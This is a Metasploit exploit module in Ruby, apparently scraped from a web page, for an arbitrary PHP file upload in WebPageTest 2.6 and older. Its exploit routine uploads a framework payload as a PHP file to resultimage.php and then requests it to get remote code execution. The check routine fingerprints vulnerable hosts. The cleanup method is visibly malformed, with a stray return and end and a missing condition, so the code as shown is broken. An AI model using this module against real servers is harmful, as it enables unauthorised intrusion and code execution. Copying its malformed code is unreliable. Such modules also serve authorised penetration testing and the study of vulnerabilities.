# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "WebPageTest Arbitrary PHP File Upload",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in WebPageTest&#039;s Upload Feature. By
                default, the resultimage.php file does not verify the user-supplied item before
                saving it to disk, and then places this item in the web directory accessable by
                remote users.  This flaw can be abused to gain remote code execution.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;dun&#039;,    #Discovery, PoC
                    &#039;sinn3r&#039;  #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;83822&#039;],
                    [&#039;EDB&#039;, &#039;19790&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [&#039;WebPageTest v2.6 or older&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Jul 13 2012",
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to WebPageTest&#039;, &#039;/www/&#039;])
                ], self.class)
    end
 
 
    def check
        peer = "#{rhost}:#{rport}"
        target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
        base = File.dirname("#{target_uri.path}.")
 
        res1 = send_request_raw({&#039;uri&#039;=>"#{base}/index.php"})
        res2 = send_request_raw({&#039;uri&#039;=>"#{base}/work/resultimage.php"})
 
        if res1 and res1.body =~ /WebPagetest \- Website Performance and Optimization Test/ and
           res2 and res2.code == 200
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
 
    def on_new_session(cli)
            print_error("No automatic cleanup for you. Please manually remove: #{@target_path}")
            return
        end
        cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
        cli.fs.file.rm(@target_path)
        print_status("#{@target_path} removed")
    end
 
 
    def exploit
        peer = "#{rhost}:#{rport}"
        target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
        base = File.dirname("#{target_uri.path}.")
 
        p = payload.encoded
        fname = "blah.php"
        data = Rex::MIME::Message.new
        data.add_part(
            "<?php #{p} ?>",                                   #Data is our payload
            &#039;multipart/form-data&#039;,                             #Content Type
            nil,                                               #Transfer Encoding
            "form-data; name=\"file\"; filename=\"#{fname}\""  #Content Disposition
        )
 
        print_status("#{peer} - Uploading payload (#{p.length.to_s} bytes)...")
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{base}/work/resultimage.php",
            &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
            &#039;data&#039;   => data.to_s
        })
 
        if not res
            print_error("#{peer} - No response from host")
            return
        end
 
        @target_path = "#{base}/results/#{fname}"
        print_status("#{peer} - Requesting #{@target_path}")
        res = send_request_cgi({&#039;uri&#039;=>@target_path})
 
        handler
 
        if res and res.code == 404
            print_error("#{peer} - Payload failed to upload")
        end
    end
end



